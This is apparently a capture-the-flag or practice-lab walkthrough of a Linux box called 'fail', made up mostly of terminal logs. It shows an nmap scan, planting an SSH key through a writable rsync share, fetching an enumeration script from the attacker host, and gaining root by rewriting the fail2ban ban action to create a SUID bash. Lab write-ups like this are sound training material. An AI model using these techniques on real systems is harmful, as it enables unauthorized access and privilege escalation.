Nmap enum
```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan]
└─# nmap  192.168.234.126 -p- -v
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-18 09:36 +08
Initiating Ping Scan at 09:36
Scanning 192.168.234.126 [4 ports]
Completed Ping Scan at 09:36, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:36
Completed Parallel DNS resolution of 1 host. at 09:36, 1.02s elapsed
Initiating SYN Stealth Scan at 09:36
Scanning 192.168.234.126 [65535 ports]
Discovered open port 22/tcp on 192.168.234.126
Increasing send delay for 192.168.234.126 from 0 to 5 due to 118 out of 392 dropped prob
es since last increase.
SYN Stealth Scan Timing: About 4.78% done; ETC: 09:46 (0:10:17 remaining)
SYN Stealth Scan Timing: About 6.35% done; ETC: 09:52 (0:15:00 remaining)
SYN Stealth Scan Timing: About 7.44% done; ETC: 09:56 (0:18:51 remaining)
SYN Stealth Scan Timing: About 8.50% done; ETC: 09:59 (0:21:43 remaining)
SYN Stealth Scan Timing: About 11.10% done; ETC: 09:58 (0:20:09 remaining)              SYN Stealth Scan Timing: About 15.15% done; ETC: 09:55 (0:16:54 remaining)              SYN Stealth Scan Timing: About 20.38% done; ETC: 09:53 (0:13:44 remaining)
SYN Stealth Scan Timing: About 24.67% done; ETC: 09:52 (0:12:43 remaining)     [361/396]
SYN Stealth Scan Timing: About 29.26% done; ETC: 09:52 (0:11:46 remaining)
SYN Stealth Scan Timing: About 33.21% done; ETC: 09:52 (0:10:54 remaining)
Discovered open port 873/tcp on 192.168.234.126
SYN Stealth Scan Timing: About 38.00% done; ETC: 09:52 (0:10:04 remaining)
SYN Stealth Scan Timing: About 42.09% done; ETC: 09:52 (0:09:15 remaining)
SYN Stealth Scan Timing: About 47.02% done; ETC: 09:51 (0:08:25 remaining)              SYN Stealth Scan Timing: About 52.29% done; ETC: 09:51 (0:07:35 remaining)
SYN Stealth Scan Timing: About 58.68% done; ETC: 09:51 (0:06:25 remaining)
SYN Stealth Scan Timing: About 60.58% done; ETC: 09:54 (0:07:12 remaining)
SYN Stealth Scan Timing: About 71.37% done; ETC: 09:57 (0:06:15 remaining)              SYN Stealth Scan Timing: About 76.13% done; ETC: 09:57 (0:05:08 remaining)
SYN Stealth Scan Timing: About 81.23% done; ETC: 09:57 (0:03:57 remaining)
SYN Stealth Scan Timing: About 86.19% done; ETC: 09:56 (0:02:51 remaining)
SYN Stealth Scan Timing: About 91.09% done; ETC: 09:56 (0:01:48 remaining)
SYN Stealth Scan Timing: About 96.07% done; ETC: 09:55 (0:00:47 remaining)
Completed SYN Stealth Scan at 09:56, 1213.55s elapsed (65535 total ports)
Nmap scan report for 192.168.234.126
Host is up (0.24s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1215.19 seconds                                     Raw packets sent: 75428 (3.319MB) | Rcvd: 66270 (2.651MB)                    ┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan]
└─# nmap  192.168.234.126 -p22,873 -sV -sC -A -T4 -v
```

Rsync ssh key injection

```
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# rsync -av --list-only rsync://192.168.234.126/
fox             fox home
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# rsync -av --list-only rsync://192.168.234.126/fox
receiving incremental file list
drwxr-xr-x          4,096 2021/01/21 22:21:59 .
lrwxrwxrwx              9 2020/12/04 04:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 12:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 12:12:36 .bashrc
-rw-r--r--            807 2019/04/18 12:12:36 .profile

sent 20 bytes  received 136 bytes  44.57 bytes/sec
total size is 4,562  speedup is 29.24
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# cp ~/.ssh/id_rsa.pub /tmp/authorized_keys
┌──(root💀DESKTOP-61F9HO2)-[~]
└─#
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# rsync -av /tmp/authorized_keys rsync://192.168.234.126/fox/.ssh/                    sending incremental file list
created directory /.ssh
authorized_keys

sent 685 bytes  received 63 bytes  299.20 bytes/sec
total size is 574  speedup is 0.77
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# rsync -av --list-only rsync://192.168.234.126/fox/
receiving incremental file list
drwxr-xr-x          4,096 2022/01/18 11:05:37 .
lrwxrwxrwx              9 2020/12/04 04:22:42 .bash_history -> /dev/null
-rw-r--r--            220 2019/04/18 12:12:36 .bash_logout
-rw-r--r--          3,526 2019/04/18 12:12:36 .bashrc
-rw-r--r--            807 2019/04/18 12:12:36 .profile
drwxr-xr-x          4,096 2022/01/18 11:05:38 .ssh
-rw-r--r--            574 2022/01/18 10:36:07 .ssh/authorized_keys

sent 21 bytes  received 199 bytes  62.86 bytes/sec                                      total size is 5,136  speedup is 23.35                                                   ┌──(root💀DESKTOP-61F9HO2)-[~]
└─#
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# ssh -i ~/.ssh/id_rsa fox@192.168.234.126
Linux fail 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ pwd
/home/fox
$ ls                                                                                    $ ls -al                                                                                total 24                                                                                drwxr-xr-x 3 fox  fox  4096 Jan 17 22:05 .                                              drwxr-xr-x 3 root root 4096 Jan 21  2021 ..                                             lrwxrwxrwx 1 fox  fox     9 Dec  3  2020 .bash_history -> /dev/null                     -rw-r--r-- 1 fox  fox   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 fox  fox  3526 Apr 18  2019 .bashrc                                        -rw-r--r-- 1 fox  fox   807 Apr 18  2019 .profile                                       drwxr-xr-x 2 fox  fox  4096 Jan 17 22:05 .ssh
$
$ cd ..                                                                                 $ ls                                                                                    fox  local.txt                                                                          $ cat local.txt                                                                         6452c625b229262c6e7149866a1d06e6
$
```

Privesc
```
$ bash -p
fox@fail:/home$ cd /tmp
fox@fail:/tmp$ wget 192.168.234.126:8000/lse.sh
--2022-01-17 22:42:46--  http://192.168.234.126:8000/lse.sh
Connecting to 192.168.234.126:8000... failed: Connection refused.
fox@fail:/tmp$ wget 192.168.49.234:8000/lse.sh
--2022-01-17 22:42:57--  http://192.168.49.234:8000/lse.sh
Connecting to 192.168.49.234:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                100%[=========================>]  42.55K  85.7KB/s    in 0.5s

2022-01-17 22:42:58 (85.7 KB/s) - ‘lse.sh’ saved [43570/43570]

fox@fail:/tmp$ chmod +x lse.sh
fox@fail:/tmp$ 
```


Fail2ban

```
fox@fail:/usr/bin$ ps aux | tail                                                        root      1079  0.0  0.0      0     0 ?        I    22:09   0:01 [kworker/0:0-ata_sff]  root      1370  0.0  0.0      0     0 ?        I    22:35   0:00 [kworker/u2:0-events_unbound]                                                                                  fox       1459  0.0  0.2   8372  5016 pts/0    S    22:42   0:00 bash -p                root     25785  0.0  0.0      0     0 ?        I    22:53   0:00 [kworker/u2:1-events_unbound]
root     25816  0.0  0.0      0     0 ?        I    22:55   0:00 [kworker/0:2-events_power_efficient]
root     25859  0.0  0.0      0     0 ?        I    22:59   0:00 [kworker/u2:2-events_unbound]
root     25911  0.0  0.0      0     0 ?        I    23:01   0:00 [kworker/0:1-ata_sff]
root     25917  0.4  1.0 250320 22208 ?        Ssl  23:02   0:00 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
fox      25925  0.0  0.1  10632  3108 pts/0    R+   23:02   0:00 ps aux
fox      25926  0.0  0.0   5292   744 pts/0    S+   23:02   0:00 tail
fox@fail:/usr/bin$ 
```

https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/

Initial file
```
# Values:  CMD                                                                 [82/1896]
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'                                                                                                              # Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page                                                    # Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the                    #          command is executed with Fail2Ban user rights.                               # Tags:    See jail.conf(5) man page                                                    # Values:  CMD                                                                          #                                                                                       actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
                                                                                        fox@fail:/etc/fail2ban/action.d$ nano iptables-multiport.conf
```


New file
```
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cp /bin/bash /home/fox/
            chmod 777 /home/fox/bash
            chmod u+s /home/fox/bash
#<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
```

```
fox@fail:/etc/fail2ban/action.d$ nano iptables-multiport.conf
fox@fail:/etc/fail2ban/action.d$ ls ~/bash -al
-rwsrwxrwx 1 root root 1168776 Jan 18 00:00 /home/fox/bash
fox@fail:/etc/fail2ban/action.d$ ~/bash -p
bash-5.0# cd /root
bash-5.0# cat proof.txt
56bf3601d284c81ab51322bb5e7e5d47
bash-5.0# ifconfig
bash: ifconfig: command not found
bash-5.0# /sbin/ifconfig                                                                ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                    inet 192.168.234.126  netmask 255.255.255.0  broadcast 192.168.234.255                  ether 00:50:56:bf:40:12  txqueuelen 1000  (Ethernet)
        RX packets 4750  bytes 446446 (435.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3458  bytes 594047 (580.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                      
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                    inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

bash-5.0# cat proof.txt                                                                 56bf3601d284c81ab51322bb5e7e5d47                                                        bash-5.0#
```
